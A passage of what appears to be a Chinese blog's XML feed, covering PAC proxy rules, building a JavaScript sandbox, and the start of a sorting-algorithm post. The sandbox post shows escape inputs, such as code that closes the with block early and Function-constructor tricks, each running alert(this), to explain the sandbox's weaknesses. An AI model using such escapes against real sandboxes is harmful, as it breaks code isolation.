文档排版整洁，离开工位闭合电脑，做好会议记录，思考旁边同事嘀咕的问题等等，都是很小很小的事情，但是粗糙的人永远都做不好这些事情。在他们眼里，这些都不是事儿，细节问题都不是问题。</p><p><strong>4、先缝上你的嘴巴，再张开</strong></p><p>刚毕业那会儿，性格上或多或少有点尖锐，现实总是与你想象中的场景有些差异，不要因为这些差异就妄自评论。把想说的话先咽下去，经过大脑过滤后再表达出来，表达的内容要凝练、简洁、有说服力、有表现力。</p><p>尤其是对外的时候，更要注意，因为公司内、外有一堵隐形的墙，有些事情只能在围墙内讨论。</p><p><strong>5、看清整个团队的全貌</strong></p><p>一个大的团队下面有很多小组，每个小组做的事情不尽相同，要看清这个团队的全貌，你需要做三件事情：沟通、沟通和沟通！找每个小组的成员和 Leader 交流，团队成员一般很少会拒绝回答实习生的问题，不要担心他们太忙，再忙也有空回答你的几个问题。当然，还有一种沟通，单向输入的，那便是读文档、读代码，摸清楚每个系统的基本结构，运行的大致流程，然后动手实践一番，这个过程中你会学到很多。</p><p>以上几点建议，不是很全面，但都是经验之谈。端正态度，提升能力，融入到团队，多交流、多沟通，同时有思考、有沉淀，并且让同事看到你的想法，如果能够引发他们对你评价或与你讨论那就再好不过了；）</p><p>（完）</p><hr><p>题图 by <a href="http://ww2.sinaimg.cn/large/6c0378f8gw1f87ht68ivnj20p00dwjv5.jpg">Jesse Gardner</a></p><p>有一个月没写东西了，不是因为太忙，而是有点懒笔了&#x3D;。 &#x3D;</p><p>忙永远只是一个借口，它只能说明，没有把「重要不紧急」的事情处理好，一旦到了某个极限点，手里上就都变成「重要并且紧急」 的事情了。</p><p>笔耕不辍，欢迎关注微信公众号小胡子哥（barretlee_com），分享生活，分享技术，我在那里等你。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实习生 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>详解代理自动配置 PAC</title>
      <link href="/blog/2016/08/25/pac-file/"/>
      <url>/blog/2016/08/25/pac-file/</url>
      
        <content type="html"><![CDATA[<p>最近一直在做跨域中华局域网的工作，了解了很多代理知识和基础概念，很零散，也很细碎。希望通过一段时间的学习，能够自由地穿梭在国际互联网和中华局域网之间。后续会写一系列文章记录我了解到的知识点，本文要说的是我们平时接触比较多的 PAC，全名为 proxy auto-config。</p><p><img src="/../blogimgs/2016/08/25/6c0378f8gw1f75co9fseuj20p00dwwhk.jpg" alt="Why Machinima&#39;s Warner Brothers round could be a bridge to nowhere"><!--<source src="http://ww4.sinaimg.cn/large/6c0378f8gw1f75co9fseuj20p00dwwhk.jpg">--></p><span id="more"></span><h3 id="什么是-PAC"><a href="#什么是-PAC" class="headerlink" title="什么是 PAC"></a>什么是 PAC</h3><p>PAC，一个自动代理配置脚本，包含了很多使用 JavaScript 编写的规则，它能够决定网络流量走默认通道还是代理服务器通道，控制的流量类型包括：HTTP、HTTPS 和 FTP。</p><p>它是一段 JavaScript 脚本：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">FindProxyForURL</span>(<span class="params">url, host</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;DIRECT&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面就是一个最简洁的 PAC 文件，意思是所有流量都直接进入互联网，不走代理。</p><h3 id="PAC-语法和函数"><a href="#PAC-语法和函数" class="headerlink" title="PAC 语法和函数"></a>PAC 语法和函数</h3><p>上面函数中，<code>url</code> 字段就是我们在浏览器地址栏输入的待访问地址，<code>host</code> 为该地址对应的 hostname，<code>return</code> 语句有三种指令：</p><ul><li><code>DIRECT</code>，表示无代理直接连接</li><li><code>PROXY host:port</code>，表示走 <code>host:port</code> 的 proxy 服务</li><li><code>SOCKS host:port</code>，表示走 <code>host:port</code> 的 socks 服务</li></ul><p>而返回的接口可以是多个代理串联：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="string">&quot;PROXY 222.20.74.89:8800; SOCKS 222.20.74.89:8899; DIRECT&quot;</span>;</span><br></pre></td></tr></table></figure><p>上面代理的意思是，默认走 <code>222.20.74.89:8800</code> 的 proxy 服务；如果代理挂了或者超时，则走 <code>222.20.74.89:8899</code> 的 socks 代理；如果 socks 也挂了，则无代理直接连接。从这里可以看出 PAC 的一大优势：自动容灾。</p><p>PAC 提供了几个内置的函数，下面一一介绍下：</p><p><strong>dnsDomainIs</strong></p><p>类似于 <code>==</code>，但是对大小写不敏感，</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_">dnsDomainIs</span>(host, <span class="string">&quot;google.com&quot;</span>) || </span><br><span class="line">    <span class="title function_">dnsDomainIs</span>(host, <span class="string">&quot;www.google.com&quot;</span>)) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;DIRECT&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>shExpMatch</strong></p><p>Shell 正则匹配，<code>*</code> 匹配用的比较多，可以是 <code>*.example.com</code>，也是可以下面这样，</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_">shExpMatch</span>(host, <span class="string">&quot;vpn.domain.com&quot;</span>) ||</span><br><span class="line">    <span class="title function_">shExpMatch</span>(url, <span class="string">&quot;http://abcdomain.com/folder/*&quot;</span>)) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;DIRECT&quot;</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>isInNet</strong></p><p>判断是否在网段内容，比如 <code>10.1.0.0</code> 这个网段，<code>10.1.1.0</code> 就在网段中，</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_">isInNet</span>(<span class="title function_">dnsResolve</span>(host), <span class="string">&quot;172.16.0.0&quot;</span>, <span class="string">&quot;255.240.0.0&quot;</span>)) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;DIRECT&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>myIpAddress</strong></p><p>返回主机的 IP，</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_">isInNet</span>(<span class="title function_">myIpAddress</span>(), <span class="string">&quot;10.10.1.0&quot;</span>, <span class="string">&quot;255.255.255.0&quot;</span>)) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;PROXY 10.10.5.1:8080&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>dnsResolve</strong></p><p>通过 DNS 查询主机 ip，</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_">isInNet</span>(<span class="title function_">dnsResolve</span>(host), <span class="string">&quot;10.0.0.0&quot;</span>, <span class="string">&quot;255.0.0.0&quot;</span>) ||</span><br><span class="line">    <span class="title function_">isInNet</span>(<span class="title function_">dnsResolve</span>(host), <span class="string">&quot;172.16.0.0&quot;</span>,  <span class="string">&quot;255.240.0.0&quot;</span>) ||</span><br><span class="line">    <span class="title function_">isInNet</span>(<span class="title function_">dnsResolve</span>(host), <span class="string">&quot;192.168.0.0&quot;</span>, <span class="string">&quot;255.255.0.0&quot;</span>) ||</span><br><span class="line">    <span class="title function_">isInNet</span>(<span class="title function_">dnsResolve</span>(host), <span class="string">&quot;127.0.0.0&quot;</span>, <span class="string">&quot;255.255.255.0&quot;</span>)) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;DIRECT&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>isPlainHostName</strong></p><p>判断是否为诸如 <code>http://barret/</code>，<code>http://server-name/</code> 这样的主机名，</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_">isPlainHostName</span>(host)) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;DIRECT&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>isResolvable</strong></p><p>判断主机是否可访问，</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_">isResolvable</span>(host)) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;PROXY proxy1.example.com:8080&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>dnsDomainLevels</strong></p><p>返回是几级域名，比如 <code>dnsDomainLevels(barretlee.com)</code> 返回的结果就是 1，</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_">dnsDomainLevels</span>(host) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;PROXY proxy1.example.com:8080&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;DIRECT&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>weekdayRange</strong></p><p>周一到周五，</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_">weekdayRange</span>(<span class="string">&quot;MON&quot;</span>, <span class="string">&quot;FRI&quot;</span>)) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;PROXY proxy1.example.com:8080&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;DIRECT&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>dateRange</strong></p><p>一月到五月，</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_">dateRange</span>(<span class="string">&quot;JAN&quot;</span>, <span class="string">&quot;MAR&quot;</span>))  &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;PROXY proxy1.example.com:8080&quot;</span>;  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;DIRECT&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>timeRange</strong></p><p>八点到十八点，</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_">timeRange</span>(<span class="number">8</span>, <span class="number">18</span>)) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;PROXY proxy1.example.com:8080&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;DIRECT&quot;</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>alert</strong></p><p>据说这个函数可以用来调试，不过我在 Chrome 上测试并未生效，</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">resolved_host = <span class="title function_">dnsResolve</span>(host);</span><br><span class="line"><span class="title function_">alert</span>(resolved_host);</span><br></pre></td></tr></table></figure><h3 id="PAC-文件的安装和注意事项"><a href="#PAC-文件的安装和注意事项" class="headerlink" title="PAC 文件的安装和注意事项"></a>PAC 文件的安装和注意事项</h3><p>在 Windows 系统中，通过「Internet选项 -&gt; 连接 -&gt; 局域网设置 -&gt; 使用自动配置脚本」可以找到配置处，下放的地址栏填写  PAC 文件的 URI，这个 URI 可以是本地资源路径(file:&#x2F;&#x2F;&#x2F;)，也可以是网络资源路径(http:&#x2F;&#x2F;)。</p><p>Chrome 中可以在「chrome:&#x2F;&#x2F;settings&#x2F; -&gt; 显示高级设置 -&gt; 更改代理服务器设置」中找到 PAC 填写地址。</p><p><strong>需要注意的几点：</strong></p><ul><li>PAC 文件被访问时，返回的文件类型（Content-Type）应该为：<code>application/x-ns-proxy-autoconfig</code>，当然，如果你不写，一般浏览器也能够自动辨别</li><li><code>FindProxyByUrl(url, host)</code> 中的 host 在上述函数对比时无需转换成小写，对大小写不敏感</li><li>没必要对 <code>dnsResolve(host)</code> 的结果做缓存，DNS 在解析的时候会将结果缓存到系统中</li></ul><h3 id="更多阅读"><a href="#更多阅读" class="headerlink" title="更多阅读"></a>更多阅读</h3><ul><li><a href="https://zh.wikipedia.org/wiki/%E4%BB%A3%E7%90%86%E8%87%AA%E5%8A%A8%E9%85%8D%E7%BD%AE">代理自动配置 - wikipedia</a></li><li><a href="https://en.wikipedia.org/wiki/Web_Proxy_Autodiscovery_Protocol">Web Proxy Autodiscovery Protocol</a></li><li><a href="https://web.archive.org/web/20070602031929/http://wp.netscape.com/eng/mozilla/2.0/relnotes/demo/proxy-live.html">Navigator Proxy Auto-Config File Format</a></li><li><a href="https://www.ibm.com/developerworks/cn/linux/1309_quwei_wpad/">WPAD 的原理及实现</a></li><li><a href="http://findproxyforurl.com/">findproxyforurl</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络交互 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> proxy </tag>
            
            <tag> 翻墙 </tag>
            
            <tag> pac </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>构建一个安全的 JavaScript 沙箱</title>
      <link href="/blog/2016/08/23/javascript-sandbox/"/>
      <url>/blog/2016/08/23/javascript-sandbox/</url>
      
        <content type="html"><![CDATA[<p><img src="/../blogimgs/2016/08/23/6c0378f8gw1f730uldkfrj20p00dwaf1.jpg" alt="Sandbox for Addies Birthday!! from //homesteadroots.blogspot.com/2010/07/sandbox-for-addies-birthday-could-also.html"><!--<source src="http://ww1.sinaimg.cn/large/6c0378f8gw1f730uldkfrj20p00dwaf1.jpg">--></p><p>在 Node.js 中有一个模块叫做 VM，它提供了几个 API，允许代码在 V8 虚拟机上下文中运行，如：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> sandbox = &#123; <span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span> &#125;;</span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.<span class="title class_">Script</span>(<span class="string">&#x27;a + b&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> context = <span class="keyword">new</span> vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line">script.<span class="title function_">runInContext</span>(context);</span><br></pre></td></tr></table></figure><p><code>vm.Script</code> 中的代码是预编译好的，通过 <code>vm.createContext</code> 将代码加载到一个上下文环境中，置入沙箱（sandbox），然后通过 <code>script.runInContext</code> 执行代码，整个操作都在封闭的 VM 中进行。这是 Node.js 提供给我们的便捷功能，那么，在浏览器环境中呢？是否也能做到将代码运行在沙箱中？本文带着大家来探索一番。</p><span id="more"></span><h3 id="代码编译工具"><a href="#代码编译工具" class="headerlink" title="代码编译工具"></a>代码编译工具</h3><p><strong>邪恶的 <code>eval</code></strong></p><p><code>eval</code> 函数可以将一个 Javascript 字符串视作代码片段执行，不过它存在诸多问题，如调试困难、性能问题等，并且它在运行时可以访问闭包环境和全局作用域，存在代码注入的安全风险，作为沙箱，这也是我们不期望看到的。<code>eval</code> 虽然好用，但是经常被滥用，在这里我们不多讨论它。</p><p><strong><code>new Function</code></strong></p><p>Function 构造函数会创建一个新的函数对象，它可以作为 <code>eval</code> 的替代品:</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">fn = <span class="keyword">new</span> <span class="title class_">Function</span>(...args, <span class="string">&#x27;functionBody&#x27;</span>);</span><br></pre></td></tr></table></figure><p>返回的 <code>fn</code> 是一个定义好的函数，最后一个参数为函数体。它和 <code>eval</code> 不太一样：</p><ul><li><code>fn</code> 是一段编译好的代码，可以直接执行，而 <code>eval</code> 需要编译一次</li><li><code>fn</code> 没有对所在闭包的作用域访问权限，不过它依然能够访问全局作用域</li></ul><p>如何阻止它访问全局作用域呢？</p><h3 id="with-关键词"><a href="#with-关键词" class="headerlink" title="with 关键词"></a><code>with</code> 关键词</h3><p><code>with</code> 是阻止程序访问上一级作用域的一道防火墙：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">compileCode</span>(<span class="params">code</span>) &#123;</span><br><span class="line">  code = <span class="string">&#x27;with (sandbox) &#123;&#x27;</span> + code + <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Function</span>(<span class="string">&#x27;sandbox&#x27;</span>, code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上代码，<code>code</code> 被执行时，首先会寻找 <code>sandbox</code> 中的变量，如果不存在，会往上追溯 <code>global</code> 对象，虽然有一道防火墙，但是依然不能阻止 fn 访问全局作用域。</p><p>似乎在 ECMAScript 5 中掌握的知识已经不足以解决 <code>code</code> 逃逸沙箱的问题了，此时我们可以把焦点放在 ES6 提供的新特性上。</p><h3 id="ES6-Proxy"><a href="#ES6-Proxy" class="headerlink" title="ES6 Proxy"></a>ES6 Proxy</h3><p>ES6 中提供了一个 Proxy 函数，它是访问对象前的一个拦截器，下面举一个简单的栗子：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> p = <span class="keyword">new</span> <span class="title class_">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">  <span class="title function_">get</span>(<span class="params">target, key</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(key === <span class="string">&#x27;a&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title class_">Reflect</span>.<span class="title function_">get</span>(target, key);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">p.<span class="property">a</span> <span class="comment">// 1</span></span><br><span class="line">p.<span class="property">s</span> <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure><p>代码中，<code>Proxy</code> 给 <code>&#123;&#125;</code> 设置了属性访问拦截器，倘若访问的属性为 <code>a</code> 则返回 1，否则走正常程序。</p><p>这里我们可以使用 <code>proxy</code> 对访问做拦截处理，<code>sandbox</code> 本不存在的属性会追溯到全局变量上访问，此时我们可以欺骗程序，告诉它这个「不存在的属性」是存在的，于是有了下面的代码：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">compileCode</span>(<span class="params">code</span>) &#123;</span><br><span class="line">  code = <span class="string">&#x27;with (sandbox) &#123;&#x27;</span> + code + <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">  <span class="keyword">const</span> fn = <span class="keyword">new</span> <span class="title class_">Function</span>(<span class="string">&#x27;sandbox&#x27;</span>, code);</span><br><span class="line">  <span class="keyword">return</span> <span class="function">(<span class="params">sandbox</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> proxy = <span class="keyword">new</span> <span class="title class_">Proxy</span>(sandbox, &#123;</span><br><span class="line">      <span class="title function_">has</span>(<span class="params">target, key</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// 欺骗，告知属性存在</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">fn</span>(proxy);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>似乎这么做就可以了，但既然用到了 ES6 的特性，我们便不能忽略 ES6 中一个可以控制 <code>with</code> 关键词行为的变量。</p><h3 id="Symbol-unscopables"><a href="#Symbol-unscopables" class="headerlink" title="Symbol.unscopables"></a>Symbol.unscopables</h3><p><code>Symbol</code> 是 JS 的第七种数据类型，它能够产生一个唯一的值，同时也具备一些内建属性，这些属性可以用来进行元编程（meta programming），即对语言本身编程，影响语言行为。其中一个内建属性 <code>Symbol.unscopables</code>，通过它可以影响 <code>with</code> 的行为。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">foo</span> = (<span class="params"></span>) =&gt; <span class="string">&#x27;global&#x27;</span>;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">  <span class="title function_">foo</span>(<span class="params"></span>) &#123; <span class="keyword">return</span> <span class="string">&#x27;clourse&#x27;</span>; &#125;</span><br><span class="line">  get [<span class="title class_">Symbol</span>.<span class="property">unscopables</span>]() &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="attr">foo</span>: <span class="literal">true</span> <span class="comment">// 不允许访问对象的 foo，直接到上层</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">with</span>(<span class="params">A.prototype</span>) &#123;</span><br><span class="line">  <span class="title function_">foo</span>(); <span class="comment">// &#x27;global&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面对 A 设置做了 <code>Symbol.unscopables</code> 的设定，声明 <code>foo</code> 属性在 A 上是不存在的，从而使得代码从 <code>with</code> 中逃逸。对此，我们需要对它做一层加固：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">compileCode</span>(<span class="params">code</span>) &#123;</span><br><span class="line">  code = <span class="string">&#x27;with (sandbox) &#123;&#x27;</span> + code + <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">  <span class="keyword">const</span> fn = <span class="keyword">new</span> <span class="title class_">Function</span>(<span class="string">&#x27;sandbox&#x27;</span>, code);</span><br><span class="line">  <span class="keyword">return</span> <span class="function">(<span class="params">sandbox</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> proxy = <span class="keyword">new</span> <span class="title class_">Proxy</span>(sandbox, &#123;</span><br><span class="line">      <span class="title function_">has</span>(<span class="params">target, key</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// 欺骗，告知属性存在</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="title function_">get</span>(<span class="params">target, key, receiver</span>) &#123;</span><br><span class="line">        <span class="comment">// 加固，防止逃逸</span></span><br><span class="line">        <span class="keyword">if</span> (key === <span class="title class_">Symbol</span>.<span class="property">unscopables</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">undefined</span>; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title class_">Reflect</span>.<span class="title function_">get</span>(target, key, receiver);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">fn</span>(proxy);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="存在的漏洞"><a href="#存在的漏洞" class="headerlink" title="存在的漏洞"></a>存在的漏洞</h3><p>不过，这里还存在两个逻辑漏洞：</p><ul><li><code>code</code> 中可以提前关闭 <code>sandbox</code> 的 <code>with</code> 语境，如 <code>&#39;&#125; alert(this); &#123;&#39;</code>；</li><li><code>code</code> 中可以使用 <code>eval</code> 和 <code>new Function</code> 直接逃逸</li></ul><p>对于第一个问题，我们可以通过堆栈深度检测：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> stack = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> char <span class="keyword">of</span> code) &#123;</span><br><span class="line">  <span class="keyword">if</span> (char === <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">    stack++;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (char === <span class="string">&#x27;&#125;&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (stack === <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Syntax Error.&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      stack--;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>事实上，这样做依然不严谨，比如代码注释中出现花括号问题，如 <code>/*&#123;*/&#39;&#125; alert(this); &#123;&#39;/*&#125;*/</code>；而对于第二个问题，暂时还没有什么好的办法，尤其是 <code>Function</code>，它可以通过很多方式构造出来：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;).<span class="title function_">constructor</span>(<span class="params"><span class="string">&quot;alert(this)&quot;</span></span>)(<span class="params"></span>);</span><br><span class="line"><span class="regexp">/2/</span>.<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&quot;alert(this)&quot;</span></span>)(<span class="params"></span>);</span><br></pre></td></tr></table></figure><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>灵活是 Javascript 这门语言的特性，也是它难以被掌控的主要原因，这点可以从文中各种沙箱逃逸方式就能看出。ES6 提供了很多新的特性，本文以沙箱为切入点，带着大家学习了几个函数和属性，希望读者有些收获。</p><p>本文没有得到一个完美的答案，但是这个问题依然值得思考和研究。</p><p>有一个比较不错的思路是，通过 iframe 执行代码，执行的结果通过 <code>postMessage</code> 函数通讯传输给操作者。并且 iframe 还提供了很多可供设置的安全参数，如 <code>allow-scripts</code>, <code>allow-forms</code>, <code>allow-same-origin</code>, <code>allow-top-navigation</code> 等等，方便我们对沙箱做安全控制。</p><h3 id="更多阅读"><a href="#更多阅读" class="headerlink" title="更多阅读"></a>更多阅读</h3><ul><li><a href="http://www.html5rocks.com/en/tutorials/security/sandboxed-iframes/">Play safely in sandboxed IFrames</a></li><li><a href="https://blog.risingstack.com/writing-a-javascript-framework-sandboxed-code-evaluation/">Writing a JavaScript framework - Sandboxed code evaluation</a></li></ul><hr><p>题图：<a href="http://homesteadroots.blogspot.com/2010/07/sandbox-for-addies-birthday-could-also.html">Sandbox for Addies Birthday</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Javascript </tag>
            
            <tag> 沙箱 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>聊一聊排序算法</title>
      <link href="/blog/2016/08/11/algorithms-of-sort/"/>
      <url>/blog/2016/08/11/algorithms-of-sort/</url>
      
        <content type="html"><![CDATA[<p>两月前花了些时间，将大学里学过的排序算法都复习了一遍，代码放在 github 上，没有整理。今天翻了翻代码，重新 review 了一遍，也顺便做了点记录。</p><p><img src="/../blogimgs/2016/08/11/6c0378f8gw1f6q2zz5oj1j20p00dwtam.jpg" alt="//graduatedegrees.online.njit.edu/wp-content/uploads/2015/08/Algorithms-In-Computer-Science.jpg"><!--<source src="http://ww3.sinaimg.cn/large/6c0378f8gw1f6q2zz5oj1j20p00dwtam.jpg">--></p><p>下面花了不少篇幅，将基础排序、希尔、归并、快排、堆排序等都介绍了一通，懒得思考的同学可以略过代码直接看文字，文章对排序的基本思路都做了介绍。</p><span id="more"></span><h3 id="三种基本排序"><a href="#三种基本排序" class="headerlink" title="三种基本排序"></a>三种基本排序</h3><p>插入排序和选择排序是两种最基本的排序算法，思路完全不一样，但是细思一番，还是挺有意思的：</p><p><code>insertion sort</code>，<a href="https://github.com/barretlee/algorithms/blob/master/chapters/chapter-2-sorting/2.1-elementary-sorts/insertion.js">插入排序</a>，思路简单来说就是把自己插入到已排好序的列表中去，交换也是颇为频繁的。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">insertion</span>(<span class="params">input</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">1</span>, len = input.<span class="property">length</span>; i &lt; len; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> j = i; j &gt; <span class="number">0</span>; j--) &#123;</span><br><span class="line">      <span class="keyword">if</span>(input[j] &lt; input[j - <span class="number">1</span>]) &#123;</span><br><span class="line">        input[j] = [input[j - <span class="number">1</span>], input[j - <span class="number">1</span>] = input[j]][<span class="number">0</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> input;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>selection sort</code>，<a href="https://github.com/barretlee/algorithms/blob/master/chapters/chapter-2-sorting/2.1-elementary-sorts/selection.js">选择排序</a>，选择排序只对最后一个被选中的元素排序。它会往后找到包括自己在内最小的一个元素，替换自己。简单来说就是把第 i 小的元素放到第 i 个序位上。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">selection</span>(<span class="params">input</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>, len = input.<span class="property">length</span>; i &lt; len - <span class="number">1</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> min = i;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> j = i + <span class="number">1</span>; j &lt; len; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span>(input[j] &lt; input[min]) &#123;</span><br><span class="line">        min = j;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    